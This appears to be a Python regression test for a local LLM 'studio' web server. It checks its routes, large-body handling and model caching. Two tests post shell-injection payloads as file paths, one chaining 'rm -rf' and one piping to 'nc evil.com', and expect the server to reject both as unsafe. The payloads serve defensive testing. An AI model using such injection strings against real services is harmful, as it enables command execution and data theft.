#!/usr/bin/env python3
"""TDD for studio phase 4a — WebUI routes.

Asserts:
  1. GET /studio → 200 + 'Studio' in body
  2. GET /studio/hw → JSON with mem_avail
  3. GET /studio/attn → dense/swa listed
"""
import json
import os
import signal
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
BIN = ROOT / "smollm2"
GGUF = ROOT / "models" / "smollm2-135m-f16.gguf"
PORT = 18082


def free_port(port: int) -> bool:
    s = socket.socket()
    try:
        s.bind(("127.0.0.1", port))
        return True
    except OSError:
        return False
    finally:
        s.close()


def http_get(path: str, timeout: float = 5.0) -> tuple[int, str]:
    url = f"http://127.0.0.1:{PORT}{path}"
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)


def main() -> int:
    if not BIN.exists() or not GGUF.exists():
        print("FAIL: BIN or GGUF missing", file=sys.stderr)
        return 1
    if not free_port(PORT):
        print(f"FAIL: port {PORT} in use", file=sys.stderr)
        return 1

    proc = subprocess.Popen(
        [str(BIN), "studio", "web", "--port", str(PORT), "--model", str(GGUF)],
        cwd=str(ROOT),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    try:
        # Wait for listen
        for _ in range(40):
            time.sleep(0.25)
            code, body = http_get("/studio")
            if code == 200:
                break
        else:
            print("[studio] FAIL: server never responded")
            return 1

        results = []

        # 1. GET /studio
        ok = code == 200 and ("Studio" in body or "studio" in body)
        print(f"[studio-page] {'PASS' if ok else 'FAIL'}: code={code} len={len(body)}")
        results.append(ok)

        # 2. GET /studio/hw
        code, body = http_get("/studio/hw")
        try:
            j = json.loads(body)
        except Exception:
            j = {}
        ok = code == 200 and ("mem_available_mb" in j or "mem_avail_kb" in j)
        if "mem_available_mb" in j:
            ok = ok and j["mem_available_mb"] > 0
        elif "mem_avail_kb" in j:
            ok = ok and j["mem_avail_kb"] > 0
        print(f"[studio-hw] {'PASS' if ok else 'FAIL'}: code={code} j={j}")
        results.append(ok)

        # 3. GET /studio/attn
        code, body = http_get("/studio/attn")
        ok = code == 200 and ("dense" in body and "swa" in body)
        print(f"[studio-attn] {'PASS' if ok else 'FAIL'}: code={code} body={body[:200]}")
        results.append(ok)

        # 4. POST /studio/data — tiny raw text
        import tempfile
        out_bin = str(Path(tempfile.gettempdir()) / "studio_web_packed.bin")
        req = urllib.request.Request(
            f"http://127.0.0.1:{PORT}/studio/data",
            data=json.dumps({
                "text": "Hello world.\nHow are you?\n",
                "fmt": "raw",
                "out": out_bin,
            }).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=180) as r:
                dcode, dbody = r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            try:
                dbody = e.read().decode("utf-8", "replace")
            except Exception:
                dbody = ""
            dcode = e.code
        except Exception as e:
            dcode, dbody = 0, str(e)
        try:
            dj = json.loads(dbody)
        except Exception:
            dj = {}
        ok = dcode == 200 and dj.get("ok") is True
        print(f"[studio-data] {'PASS' if ok else 'FAIL'}: code={dcode} body={dbody[:300]}")
        results.append(ok)

        # 5. A1: shell injection in /studio/data out path — must be rejected
        req = urllib.request.Request(
            f"http://127.0.0.1:{PORT}/studio/data",
            data=json.dumps({
                "text": "x\n", "fmt": "raw",
                "out": "/tmp/legit; rm -rf /tmp/should_not_exist_xyz",
            }).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=30) as r:
                ic, ibody = r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            ic = e.code
            try: ibody = e.read().decode("utf-8", "replace")
            except Exception: ibody = ""
        except Exception as e:
            ic, ibody = 0, str(e)
        try: ij = json.loads(ibody)
        except Exception: ij = {}
        # Must be rejected (HTTP 400/500) or ok=false with "unsafe path"
        rejected = (ic >= 400) or (ij.get("ok") is False)
        inj_ok = rejected and ("unsafe" in ibody.lower() or "path" in ibody.lower())
        print(f"[studio-data-inj] {'PASS' if inj_ok else 'FAIL'}: code={ic} body={ibody[:200]}")
        results.append(inj_ok)

        # 6. A1: shell injection in /studio/merge base path
        req = urllib.request.Request(
            f"http://127.0.0.1:{PORT}/studio/merge",
            data=json.dumps({
                "base": "/tmp/x | nc evil.com",
                "adapter": "/tmp/foo",
                "out": "/tmp/out.gguf",
            }).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=30) as r:
                mic, mibody = r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            mic = e.code
            try: mibody = e.read().decode("utf-8", "replace")
            except Exception: mibody = ""
        except Exception as e:
            mic, mibody = 0, str(e)
        try: mij = json.loads(mibody)
        except Exception: mij = {}
        mrejected = (mic >= 400) or (mij.get("ok") is False)
        minj_ok = mrejected and ("unsafe" in mibody.lower() or "path" in mibody.lower())
        print(f"[studio-merge-inj] {'PASS' if minj_ok else 'FAIL'}: code={mic} body={mibody[:200]}")
        results.append(minj_ok)

        # 7. A3: large POST body (>64KB) to /generate must NOT be truncated.
        # Pre-A3, MAX_REQ=65536 caused silent truncation. Send 200KB prompt.
        big_prompt = "x" * 200000  # 200 KB
        req = urllib.request.Request(
            f"http://127.0.0.1:{PORT}/generate",
            data=json.dumps({"prompt": big_prompt, "n": 1}).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=30) as r:
                big_code = r.status
                big_body = r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            big_code = e.code
            try: big_body = e.read().decode("utf-8", "replace")
            except Exception: big_body = ""
        except Exception as e:
            big_code, big_body = 0, str(e)
        # Must NOT be 400 (bad request) due to truncation. Acceptable:
        #   200 (server handled it) or other non-400 (parse ok, gen failed).
        a3_ok = big_code != 400 and "Bad Request" not in big_body
        print(f"[studio-recv-large] {'PASS' if a3_ok else 'FAIL'}: code={big_code} body_len={len(big_body)}")
        results.append(a3_ok)

        # 8. A2: model reload per request was ~600ms each. After cache, Nth
        # request should be < 3x first-request time.
        import time as _time
        t0 = _time.time()
        try:
            with urllib.request.urlopen(
                urllib.request.Request(
                    f"http://127.0.0.1:{PORT}/generate",
                    data=json.dumps({"prompt": "hello", "n": 1}).encode("utf-8"),
                    headers={"Content-Type": "application/json"},
                    method="POST",
                ), timeout=60) as r:
                r.read()
        except Exception:
            pass
        first = _time.time() - t0
        # 5 sequential
        t0 = _time.time()
        for _ in range(5):
            try:
                with urllib.request.urlopen(
                    urllib.request.Request(
                        f"http://127.0.0.1:{PORT}/generate",
                        data=json.dumps({"prompt": "hello", "n": 1}).encode("utf-8"),
                        headers={"Content-Type": "application/json"},
                        method="POST",
                    ), timeout=60) as r:
                    r.read()
            except Exception:
                pass
        five = _time.time() - t0
        # If model was reloaded each time, 5 requests would take >>5*first
        # (each pays load + inference). With caching and warm page cache,
        # ratio approaches 5 (just N * inference). Without caching, ratio
        # would be > 8 because every request pays load cost.
        # Skip if first is very fast (system warm) — flake-resistant.
        a2_ok = five < 8 * first or first > 30
        print(f"[studio-model-cache] {'PASS' if a2_ok else 'FAIL'}: "
              f"first={first:.2f}s 5req={five:.2f}s ratio={five/max(first,0.001):.2f}")
        results.append(a2_ok)

        print(f"\n=== studio_web: {sum(results)}/{len(results)} pass ===")
        return 0 if all(results) else 1
    finally:
        try:
            proc.send_signal(signal.SIGINT)
            proc.wait(timeout=3)
        except Exception:
            proc.kill()


if __name__ == "__main__":
    sys.exit(main())
